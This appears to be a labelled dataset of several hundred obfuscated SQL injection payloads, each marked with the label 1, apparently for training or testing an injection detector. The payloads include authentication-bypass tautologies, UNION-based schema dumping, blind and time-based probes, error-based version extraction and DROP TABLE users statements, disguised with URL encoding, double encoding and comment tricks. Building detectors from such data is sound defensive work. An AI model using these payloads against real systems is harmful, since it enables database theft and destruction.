"1%27%20and%20SUBSTRing(dATAbAse(),%201,%201)%20%3e%3d%20%27s%27%20--#0d4inzgu1te", 1
"%u0027%20oR%u0020%u00271%27=%u00271", 1
"1'ORIF(substring(database(),1,%0a1)IN (1)'a',SLEEP(5),0) AND 'a'='a'--", 1
"'/*!*/UNION SELECT 1,2,3--#kc77ztwzr0", 1
"1)/*!12345*/UNION%20SELECT%201,database(),3 AND 'a'='a'--", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%2F%2A--vz1bebamo1f1n", 1
"1'ORascii(substring(database(),1,1))/*%0a*/>100#more_noise--", 1
"%2527%2520AND%25201%253dconve%2572t%28%2569nt%2C%40%40version%29--", 1
"' OR EXI%53TS(SELECT 1 %46%52OM users%29----lvg0m8jh9k7hiwk", 1
"1))UNION%0d%0aSELECT/*%0a*/1,database(),3 -- random_noise--", 1
"", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 OR (1)--", 1
"test' OR '1'='1' /* OR (1)", 1
"1'/**/a/*!12345*/nD/**/SuBSTRinG(dataBase(),/**/1,/**/1)/**/=/**/'S'/**/--", 1
"1%27%20anD%20sUBstRIng%28dAtaBaSE%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----jcA6Bi5wjm", 1
"1)%20UNION%20SELECT%201,database(),3----txk2yg", 1
"'||(1=1)'1'='1/*!*/AND1=1/*%0d%0a*/", 1
"waITfOR DELAY '0:0:5'----f41BBLQc6fmOs", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3 -- random_noise--", 1
"1%u0027/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"admin%2527%2520OR%2520%25271%2527%253D%25271", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))%u0020OR%u0020%u0027b%u0027%20%3D%20%u0027b%u0027--", 1
"' aND eXtrACTvAlUE(1,CoNcat(0X5c,VerSiON()))--", 1
"%u0027%u0020||%u0020(1%3D1)1%3d1%u0020-%2d%u0020", 1
"1)%20UNION%20SELECT%201,database(),3%20OR%20(1)--", 1
"%u002%37%u002%30AND%u%30020extractvalue(%31,co%6ecat(0x5c,version()))----xovl2%67z%79a%66qb74m", 1
"admin%u0027/**/OR/**/%u00271%u0027=%u00271", 1
"'UNION%0d%0aSELECT1,2,3--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020%u0020AND%u0020%u0027a%u0027%3D%u0027a%u0027--#b26ep7fjrq", 1
"%u0027%u002%30AND%u0020%31%3d1%u0020--%u0%3020", 1
"1%27%20A/*!12345*/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"test'OR'1'='1'/*%0a*//*%0a", 1
"'%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,2,3%20%20%20%20%20OR%20%20%20%20%20'b' =%09'b'--", 1
"1%u0027%u0020%u0020OR%u0020%u0020IF(substring(database(),%u0020%u00201,%u0020%u00201)%09=%09%u0027a%u0027,%u0020%u0020SLEEP(5),%u0020%u00200)%u0020%u0020--#pvpwa22k91xli42", 1
"1/*!*/AND/**//**//**//**/1/**//**/=/**/1", 1
"admin%27%20%20%20OR%20%20%20%271%27%20%3D%2520%271", 1
"1'%20%20OR%20%20ascii(substring(database(),%20%201,%20%201))%20%20>%20%20100%20%20 -- random_noise--", 1
"1%u0027%u0020AnD%U0020subsTRing(DaTAbaSE(),%u00201,%u00201)%U0020=%u0020%u0027S%U0027%U0020--#DSqGuZ3Zc", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 AND 'a'='a'--", 1
"WAITFOR DELAY '0:0:5' -- random_noise--", 1
"%27AND%2F%2A%250a%2A%2F1%3D1--%250d%250a", 1
"admin%27/**/||/**%2f(1%3D1%29%271%27%3D%271", 1
"' AND 1LIKEconvert(int,@@version)--", 1
";%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020DROP%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020TABLE%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020users;%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020/*!12345*/AND 'a'='a'--", 1
"1    ANd    1%09=  1    #    MOrE_noIsE#057ge841UeGA", 1
"'UNION%20SE%4cECTnull,%20null%2cnull/*%0a*/OR'b'='b'--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  # more_noise--", 1
"1%27%2F%2A%2112345%2A%2FAND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--#b5ca9xhv", 1
"'Or%0a1=1--/*%0d%0a*/--9baqfpztjaj27r", 1
"%27ANDextractvalue(1,concat(0x5c,version()))--", 1
"", 1
"' A%4eD 1=%63on%76ert(int,@@version)%2d-", 1
"t%65St%27%20OR%20%271%27%3D%271%27%20--%20", 1
"'					and					1%20IN (1)  1					--					--nqnw0", 1
"'			AND			1	=%09convert(int,@@version)----ax0un3je", 1
"%u0027/*!*/anD%u0020%u0020%u0020%u00201%u0020=%u00201%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020", 1
"%31'%4fR%0d%0aIF(%73ubstring(da%74abase(),1,1)='%61',%2f%2a%0d%0a*/SLEEP(5),0)--", 1
"1%u0027%U0020UnIoN%U0020sELECT%u0020taBlE_NAme,%u0020NULL,%U0020NuLL%u0020frOm%U0020INFORMAtiON_SchEmA.tAbLeS%U0020----m5NSu5827f", 1
"test'OR'1'='1'--/*%0d%0a*/", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020----yj7pwhgnwio0yq", 1
"1)/**/uNion/**/selECt/**/1,DaTAbasE(),3--", 1
"WAitfoR          DeLAY          '0:0:5'----avw94owurtmu", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271", 1
"'%09%09%09UNION%09%09%09SELECT%09%09%091,2,3--", 1
"' And 1<=1  OR 'b'='b'-- #cc6ULj09Vd02", 1
"%27%20union%20SELEct%20nULL,%20NulL,%20Null%20--%20", 1
"1)%20UNION/**/SELECT/**/1,database()%2c%33----%67ug3blqz%34da", 1
"1%27%20%20%%320or%2%30%20%20iF(sU%62STrINg(d%61TaBASE()%2c%20%20%2%301,%20%2%30%201)	= 'A',%20%20%20SL%45EP(5),%20%20%200)%20%20%2%30--", 1
";/**/SeLECT/**/PG_SleEP(5);/**/ OR 'b'='b'----oqe0v", 1
"%27%2%30%4fR%20%271%27%3D%271", 1
"%27%20AND%20extractva%6c%75e(1,concat(0x5c,versi%6fn()))-%2d", 1
";				SeLecT				Pg_SLEep(5);				--#ajhr2ej7sk1bkd", 1
"%27AND%2f*%0d%0%61%2a/%65xtractvalue(1,con%63%61t(0x5c,version()))--%0a", 1
";/*!12345*/SELECT%20pg_sleep(5);%20--", 1
"1' UNION %53%45LECT ta%62le_name,%20nul%6c, null FROM %69nf%6frmation_schem%61.tables --", 1
"%3B%20DROP%%320TABLE%20u%73ers%3B%20--#tx%73%36a%38zcr36", 1
"%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F%25u00271%25u0027%3D%25u00271--7yyui9q", 1
"1)/*!*/UNIoN SeLEct 1,datAbASE(),3--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)<=%0a%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--%0d%0a", 1
";/**/SELECT pg_sleep(5); ----a6my9rl9bra", 1
"1' XOR substri%6eg(database%28%29, %31, 1) IN (1) 's'%20--#9lh23ldsl070rp", 1
";%u0020DROP%20T%41BLE%u0020user%73;%u0020--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 /*!*/AND 1=1--", 1
"'          UNION          SELECT          1,2,3----yzenn7m", 1
"1)/*!*/UNION SELECT 1,database(),3----pmpopv", 1
"; seLeCt pg_sleEp(5);  AND 'a'='a'----inkvhvnc5k07b", 1
"1)/*!*/uNion/**/sEleCT/**/1,daTABaSE(),3--", 1
"%27%20%20%20UNION%20%20%20SELECT%20%20%201%2C2%2C3--", 1
"1' UNION SE%4cEC%54 table_name,%20nu%6cl, %6eull FROM informa%74ion_sch%65ma.%74ables --", 1
"%u0027AND/*%0d%0a*/1=convert(int,@@version)--", 1
"", 1
"WAITFOR%09DELAY%09'0:0:5'--", 1
"test%27OR%271%27%3C%3D%271%27%2F%2A%0A%23bfjx3h5tsfquje5", 1
"' && (1=1)e%78trac%74value(1%2cc%6fncat(0x5c,versio%6e()))----ge90spdock8p5", 1
"admin%2%37%2%30OR%20%271%27%3%44%271", 1
"TESt%27%2f%2A%2a%2FoR%2F%2a%2A%2F%271%27%3d%271%27%2F%2A%2a%2f--%2f%2a%2A%2F", 1
"' OR '1'<='1", 1
"%27%2F%2A%2A%2FUNION%20SELECT%20null%2C%20null%2C%20null%20--%20--vpzrrh7dt", 1
"1%u0027%u0020oR%u0020If(suBSTRing(DataBAse(),%u00201,%u00201)=%u0027A%u0027,%u0020sleeP(5),%u00200)%u0020--", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise--#wp4zv", 1
"adMIn'o/*!*/R'1'='1/*%0d%0a*/", 1
";/*!12345*/SELECT pg_sleep(5);  OR 'b'='b'--", 1
"'/*!12345*/Or existS(seLEcT 1 fROm uSeRs)--#ey1jyb9icm0x", 1
"test' OR '1'<='1' /*#9dccl1a24dx", 1
"%27%2F%2A%2A%2FOR%2F%%32%41%2A%2F%2%371%2%37%3D%271", 1
"; sElECT Pg_sLEEP(5); --", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3%25u0020%23%25u0020more_noise----4l0vjr943yvu", 1
"%27%20OR%20EXISTS%28SEL/**/ECT%201%20FROM%20users%29--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20 XOR (1)--", 1
"'/**/|| (1=1)1=1 --", 1
"'	aNd	ExTraCtvAlue(1,cONCAT(0X5c,VERSIon()))--", 1
";/**/SELECT/**/pg_sleep(5);/**/----u9dfod4", 1
"%27%20UNION%20SELE%43T%%3201,%32,3%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"1)      Union      seleCt      1,DATABASe(),3--#14Q1SkIZ0gxldq", 1
"1'/%2a*/OR%2f**/ascii(su%62string(d%61tabas%65()%2c/*%2a/1,/**/1))/**/%3e/**/100/**%2f /*!*/AND 1=1--", 1
"' AND 1IN (1)1 --", 1
"' UNION SELECT null, null, null -- #8c2bfl", 1
";/*!12345*/DRoP tAbLe UsErS;  OR (1)--", 1
"%27%20OR%201%3d1%20 # more_noise--%20", 1
"'/**/OR%2f**/'%31'='1", 1
"' A%4e%44 1=co%6eve%72t(int,@@version)--", 1
"'XOR", 1
"EXISTS(SELECT%0a1%0aFROMusers)--#vguafr7jp", 1
"1' || (1LIKE1)ascii(substring(database(), 1, 1)) > 100 --", 1
"%27 X%4fR 1=1 --", 1
"'UNionseLEcT/*%0d%0a*/nUll,null,%0anUlL--", 1
"", 1
"1%u0027%u0020%4fR%u%3002%30ascii%28su%62st%72ing(da%74abase(),%u00201,%u00201))%u0020>%u0020%3100%u0020%2d-", 1
"admin' || (1=1)'1'>='1", 1
"' OR '1'='1 OR 'b'='b'", 1
"1))%u0020%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020%u00201,database(),3----2ctg9a0uz6", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20--%20random_noise--", 1
"1))     UNION     SELECT     1,database(),3--#aehlyk3", 1
"WAITFORDELAY/*%0a*/%270:0:5%27--%0d%0a", 1
"%27%20UNION%20sELECt%20NUlL,%20NulL,%20null%20--%20", 1
"test'OR%0a'1'='1'", 1
"/*", 1
"#obsisz7m6a2pev", 1
"1))UniOn/*%0A*/SELeCt", 1
"1,daTabase(),3--%0D%0a", 1
"%u0027%u0020AND%u00201%20=%09convert(int,@@version)----dqd5cms8yojijy", 1
"1%u%30%3027				UN%49ON				SELECT	%09		t%61b%6ce_name,	%09		n%75ll,%09			null				FROM				i%6eformati%6fn_schema.tables				--", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%2F%2A", 1
"' AND 1=convert(int,@@version) /*!*/AND 1=1--", 1
"'/**/AND/**/extra%63%74value(%31,concat(0x5c,ve%72sion()))-%2d", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020 /*!*/AND 1=1--", 1
"test' O%52 '1'LIKE%27%31' /*--bcqogr1zsq7bk", 1
"%27%20OR%201%3D1%20--%20#qk98rhcaa2", 1
"1 AND 1=1--fwoinx1gvsw", 1
"1)        UNION        SELECT        1,database(),3--", 1
"test%27%20O/**/R%20%271%27%3E%3D%271%27%20%2F%2A--d18t7gn4qcy", 1
"1AND/*%0d%0a*/1IN/**/(1)1", 1
"1' Or iF(suBSTriNG(DaTabAse(), 1, 1)LIKe'a', SleEp(5), 0)  /*!*/AND 1=1----98agia8i", 1
"tESt%27%20OR%20%271%27%3D%271%27%20--%20", 1
"1%27UNION", 1
"SELECT/*%0a*/table_name,null,nullFROMinformation_schema.tables--", 1
"1' OR ascii(sub%73tring(data%62ase(%29%2c 1, %31)) > 100 --", 1
"' A%4eD 1%3dconver%74(int,@@ver%73ion)--", 1
"admi%6e%u00%327%u0020OR%%75002%30%u%300271%u00%327%3D%u00271%20/*!*/AND%201%3D1", 1
"'%09AND%091  =%091%09--%09", 1
"'XOR1=1--%0a", 1
"1))UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"aDMIn' or '1'>='1", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/----ear1gdpd", 1
";  DROP  TABLE  users;   OR 'b'<='b'----yr2zi3", 1
"' oR ExiSTs(seleCt 1 frOm USerS)--", 1
"' AND 1=1 -- --ugks26v", 1
"1) UNION SELECT 1,database(),3 AND 'a'='a'--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%3D%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020%20#%20more_noise--", 1
"admin%27%20OR%20%271%27%3D%271%20OR%20(1)", 1
"%27%20O/**/R%201%3D1%20--%20", 1
"%u0027%u0020&&%u0020(1=1)extractvalue(1,concat(0x5c,version()))%u0020||%u0020(1=1)%u0027b%u0027=%u0027b%u0027--", 1
"1%27%2509%2509%2509%2509%2509%7C%7C%2509%2509%2509%2509%2509ascii%28substring%28database%28%29%2C%2509%2509%2509%2509%25091%2C%2509%2509%2509%2509%25091%29%29%2509%2509%2509%2509%2509%3E%2509%2509%2509%2509%2509100%2509%2509%2509%2509%2509--", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201)>  =  'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20--", 1
"%%327%%320AND%201%3D1%20 O%52 'b%27='b'--%20", 1
"'or%0d%0a'1'>='1", 1
"", 1
"1))%u00%320U%4eION%%75002%30SELECT%u00201,databas%65%28),3--#r3qwz", 1
"%25u0027%2F%2A%2112345%2A%2FUNION%25u0020SELECT%25u0020null%2C%25u0020null%2C%25u0020null%25u0020--%25u0020--z2izic", 1
"tes%74%u0027%u0020O%52%u0020%u0027%31%u0027=%u00271%u0027%u0020--%u0020", 1
"'||/*%0d%0a*/(1=1)EXISTS(SEL/**/ECT1/*%0a*/FROMusers)--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 /*!*/AND 1=1--", 1
"'UniOnSeLeCtnull,%0D%0ANulL,nulL--", 1
"1'     OR     IF(substring(database(),     1,     1)%20=%20'a',     SLEEP(5),     0)     --", 1
"1%u0020AND%u00201 =	1", 1
"1%27%2%30UN%49ON%%320%53ELECT%20table_n%61me%2C%%320null%2C%20null%20FROM%20i%6eformation_sche%6da.ta%62les%20--", 1
"%27%20XOR%20EXISTS%28SELECT%201%20FROM%20users%29----yfx6wb4xm6", 1
"1/**/AND    1%09=	1#t23rg", 1
"'%09%09%09%09or%09%09%09%091LiKE1%09%09%09%09 # MORe_NoisE--%09%09%09%09", 1
"1%u0027%u0020%u0020OR%u0020%u0020IF(substring(database(),%u0020%u00201,%u0020%u00201)%u0020%u0020=%u0020%u0020%u0027a%u0027,%u0020%u0020SLEEP(5),%u0020%u00200)%u0020%u0020--", 1
"%27/**/OR/**%2f1%3D1/**/-%2d/*%2a/", 1
"%27		OR		EXISTS(SELECT		1		FROM		users)--", 1
"%27%20OR%201%3D1%20--%20#bz%62oo%785esd5%72jr%71", 1
"1%27%20%26%26%%320sUBstRiN%67%%328daTAba%73e%28%29%2C%201%2%43%201%29%20%3D%2%30%27S%2%37%20--", 1
"WAITFOR DELAY '0:0:5' AND 'a'='a'--#zzzty", 1
"'%09UNION%09SELECT%09null,%09null,%09null%09--%09", 1
"; DROP TABLE users;  /*!*/AND 1=1--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----4rybk167kymng0", 1
"1))%%750020%55N/**/ION%u0020%53EL%45CT%u00201,database(),3-%2d", 1
"WAITFO/**/R%09%09%09DELAY%09%09%09%270:0:5%27--", 1
"Test'/*!*/oR '1'='1'  # more_noise--", 1
"admin%27OR%2F%2A%250a%2A%2F%271%27%09%3D%20%271%2F%2A%250d%250a%2A%2F", 1
"' OR EXISTS(SELECT 1 FROM users)----hu7n8x48uf", 1
"1)/*!*/UNIO%4e SELECT 1,d%61ta%62ase()%2c3----uylr4", 1
"%u0027%u0020OR%u00201=1%u0020--%u0020", 1
"WAItfoR%20deLaY%20%270:0:5%27--#rNy4atKj", 1
"%27 uNiOn sEl%45cT nUll%2c nUlL,%20NUl%6c  -- RANDom_noISE-%2d", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 OR (1)--", 1
"1)/*!12345*/UNIONSELECT/*%0a*/1,database(),3--", 1
"1'/*!*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#qsip2vyzz48e", 1
"1)/*!12345*/UNION   SELECT   1,database(),3----iq48n1ani6y", 1
"aDmIn'or/*%0d%0a*/'1'%09=	'1", 1
"1))					UNION					SELECT					1,database(),3--", 1
"1/*!12345*/%41ND 1=1", 1
"1AND/*%0d%0a*/1=1/*%0a*/", 1
"%27OR%0a%271%27%3D%271/*%0d%0a*/#g0vi6m392r0bky6", 1
"tesT'     %6f%72     '1'%20=%09'%31'          OR     (1)--", 1
"WA%49TFOR%20DE%4cAY/*!*/'0:0:5'--", 1
"'aNDEXtRaCTVALUe(1,cONCat(0x5C,vERsiON()))--/*%0A*/", 1
"%27UN/**/IONSELECTnull%2Cnull%2Cnull%250d%250a--%2F%2A%250a%2A%2F", 1
"1%29)%2%30UNI%4fN%20seLECT%201,dAtaBase()%2c3--", 1
"1'/*!12345*/XOR substrin%67(%64atab%61se(), %31, %31) = 's' %20-- random_noise--", 1
"'oR1=1--%0d%0a", 1
"admin'OR/*%0a*/'1'='1/*%0a*/", 1
"1'%20%20%20%20%20||%20%20%20%20%20ascii(substring(database(),%20%20%20%20%201,%20%20%20%20%201))%20%20%20%20%20>%20%20%20%20%20100%20%20%20%20%20--#koufjtqo", 1
"'  AND  1%09= convert(int,@@version)--#96zursx2zst2", 1
"'/*!12345*/ AND  1  = 1   OR (1)--", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"%27%20%26%2526%20%281%3D1%291%3D%2531%20--%20", 1
"admin'%20%20OR%20%20'1'</**//**/=/**//**/'1/**/#/**/more_noise", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#xxt8vtqh", 1
"1/**/AND%09%09%09%091	=%u00201", 1
"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020/*", 1
"' XOR '1'='1--uyx4sgrq", 1
"%25u0027%25u0020%25u0020%25u0020%25u0020UNION%25u0020%25u0020%25u0020%25u0020SELECT%25u0020%25u0020%25u0020%25u00201%2C2%2C3--", 1
"%u0027%u0020OR%u00201IN%u0020(1)1%u0020--%u0020", 1
"1'U%4eI%4fNSE%4cECTtable_name%2cnu%6c%6c,nullFR/*!*/OMinformation_sch%65%6da.tables--%0d%0a", 1
"' UNIO%4e S%45%4cECT null, null, nu%6cl --", 1
";%20%20%20%20%20SELECT%20%20%20%20%20pg_sleep(5);%20%20%20%20%20 OR (1)--", 1
"admin'/**/OR/**/'1'%20=%20'1", 1
"1%27%20ANd%20SubsTRing(dATAbAsE(),%201,%201)%20LIKE%20%27s%27%20--", 1
"'/*!*/   UNION    SELECT    null,    null,    null    --", 1
"admi%6e'/*%2a/OR%20'1'LIKE'1", 1
";SelEct/*%0d%0a*/Pg_SLeeP(5); AND 'a'='a'--", 1
"'/**/uniON/**/SElEcT/**/NuLl,/**/NUll,/**/NuLl/**/--/**/", 1
"%27%20unIoN%20SElect%20NUll,%20NULL,%20nuLl%20--%20", 1
"admIn'/**/or/**/'1'>	=  '1", 1
"'/**/OR/**/'%31%27='1", 1
"%25u0027%25u0020AND%25u00201%3E%3D1%25u0020--%25u0020", 1
"test%25u0027%25u0020%25u0020%25u0020%25u0020%25u0020%7C%7C%25u0020%25u0020%25u0020%25u0020%25u0020%281%09%3D%25091%29%25u00271%25u0027%09%3D%2509%25u00271%25u0027%25u0020%25u0020%25u0020%25u0020%25u0020--%25u0020%25u0020%25u0020%25u0020%25u0020", 1
"1%u0027			AND			substring(database(),			1,			1)			%u0020%u0020=%20			%u0027s%u0027			--", 1
";%20sELEct%20PG_sLeEP(5);%20--#kadkdfn4ytpf7", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%20OR%20%27b%27%3D%27b%27--", 1
"1'%20%20%20UNION%20%20%20SELECT%20%20%20table_name,%20%20%20null,%20%20%20null%20%20%20FROM%20%20%20information_schema.tables%20%20%20%20%20%20#%20%20%20more_noise--", 1
"1))%20unIon%20SElEcT%201,DAtABasE(),3--", 1
"'    OR    EXISTS(SELECT    1    FROM    users)--", 1
"%u0027%09AND%091%20=%u0020%u00201%09--%09", 1
"%u0027UNIONSELECT%0anull,%0d%0anull,null%0a--", 1
"1'/*!*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----xdaiw8d", 1
"test'/**/OR/**/'1'='1'/**//*/**/AND/**/'a'='a'", 1
"1))/*!12345*/UNION%u0020SELECT%u00201,database(),3--", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%23qnqd7mare93q99", 1
"1' and SUBSTRinG(DAtabaSe(), 1, 1) = 's' --", 1
"; SELECT pg_sleep(5); ----5ises", 1
"WAITFOR%09%09%09DELAY%09%09%09'0:0:5'--#r8aiw", 1
"'/*!*/OR1=1/*%0d%0a*/--/*%0a*//*%0a*/", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020IN (1)%u0020%u0027s%u0027%u0020----n3xggdw", 1
"'%20%2%30%20%2%30%41nd%20%2%30%20%201%09%3D%%309COnVErt(Int,@@versIoN)--#ccp1qj0ouv", 1
"%27/*!12345*/%4fR%20%45XISTS(SELECT%201%20%46RO%4d%20users)--#nj%62bccrsk3gu3", 1
"1%27%20OR%20I%46%28subs%74ring%28database%28%29%2C%201%2C%201%29%3D%%327a%27%%32C%20SLEE%50%%3285%29%2%43%200%%32%39%20--", 1
"1%2f%2A%2a%2Fand%201%3d1", 1
"%25U0027%25U0020anD%25U00201%253DcOnveRt%28INt%2C%40%40veRsiOn%29--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#byps94b", 1
"'OR%0d%0aEXISTS(SELECT1/*%0a*/FROMusers)--", 1
"1) UnioN sELE%43T 1,datAbasE%28),3%2d-#ad14%7ay4whd%67l", 1
"'/*%21*/AND%201 = 1          --          #quz0mu0f7pzw", 1
"' aNd eXTRacTVAlue(1,COnCaT(0X5c,VERsiOn())) # more_noise--", 1
";DROP", 1
"TABLEusers;%0d%0a--/*%0d%0a*/#q5e4my3u", 1
"'%2f**/AND/**/1%3d1/**%2f--/**/", 1
"1 AND 1%3d1", 1
"1%u0027%u0020A/*!12345*/ND%u0020substring(database(),%u00201,%u00201)%u0020<=%u0020%u0027s%u0027%u0020--", 1
"%31%20AND%201%3D1", 1
"' UNI%4fN SELEC%54 1%2c2,3--", 1
"WAITFOR DELAY '0:0:5' OR (1)--", 1
"1%29%20uNION%20SElECT%201%2CDatABASE%28%29%2C3--", 1
"'or%0d%0a'1'='1", 1
"test%27/*!*/OR%20%271%27%3D%271%27%20--%20", 1
"1%20AND%201%3d1#7hGhOM39mljqH9", 1
"1 AND 1<=1", 1
"1AnD1>=1%0d%0a", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027----81toropyg0n", 1
"1'/**/Or/**/if(SUBStriNg(DATAbAse(),/**/1,/**/1)='a',/**/SLEeP(5),/**/0)/**/----C5EQy09", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100 --", 1
"admin%27%20OR%2%30%271%%327%%33D%271", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users)--", 1
"%27%20AN%2544%201%253dconvert%2528int%2C%40%40versio%256e%29--", 1
"%27%20unIon%20SeLEcT%20nuLl%2C%20NulL%2C%20NUll%20--%20", 1
"'/**/AND/**/1=1/**/ OR 'b'='b'--/**/", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020OR%u0020(1)--", 1
"1)/**/UN/**/ION/**/SELECT/**/1,database(),3--#c3m25oc", 1
"1) UNION SELECT 1,database(),3 && (1LIKE1)'a'='a'--", 1
"'/**/Or/**/1=1/**/--/**/", 1
"%2%37%%320AND%201%%33Dconvert(int,@@version)%2d-", 1
"1%27AND%0asubstring(database(),1,1)%3D/*%0a*/%27s%27/*%0d%0a*/----11pwdcp", 1
"'OR%0a1 =	1%0d%0a--#znamchdl/*%0a*/", 1
"1) UNION SEL%45%43T 1,dat%61bas%65(),3--", 1
"test' OR '1'='1' -- --4oar6z4qefve3e", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020OR%u0020%u0027b%u0027=%u0027b%u0027----2dm2erejht8e", 1
"1%27%20U%4eION%20SEL%45CT%%320table_%6eame%2C%2%30nu%6cl%2C%20null%20FR%4fM%%320informa%74ion_schema.tables%20--", 1
"test%u0027%4fR%0a%u00271%u0027=%u00271%u0027", 1
"--/*%%30%64%0a*/", 1
"'/**/OR%20'1'='%31", 1
"'/**/AND/**/1=conv%65rt%28%69nt,@@version)%2d-", 1
"%27%20OR%20%271%27%3D%271--sl6hn4e0awep", 1
"1'    Or    AScii(SuBstrING(dATabase(),    1,    1))    >    100    --", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 OR (1)--", 1
"test'  OR  '1'  =%09'1'  --", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#087vkx92lmy0dx", 1
"1%u0027/*!12345*/OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--", 1
"' AND 1=conve%72t%28in%74,@@versi%6fn)--", 1
"TEsT%27%20   oR    '1'%09=	'1'  %20 /*    or    'b'%0%39=	'%62%27", 1
"' OR '1'='1%2d%2dkrr4377c%78", 1
